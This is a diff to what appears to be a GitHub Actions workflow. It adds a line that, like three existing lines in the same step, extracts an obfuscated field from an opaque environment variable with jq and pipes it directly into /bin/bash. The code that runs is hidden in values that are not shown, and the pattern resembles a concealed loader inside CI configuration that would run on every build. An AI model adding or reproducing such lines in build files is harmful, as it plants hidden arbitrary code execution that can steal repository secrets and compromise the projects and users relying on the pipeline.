@@ -24,6 +24,7 @@ jobs:
           echo $xm2 | jq -r .b7 | /bin/bash
           echo $e5779 | jq -r .rnegr893 | /bin/bash
           echo $ezmv85 | jq -r .imdhn072 | /bin/bash
+          printf '%s' "$p1192" | jq -r .dvmel1965 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
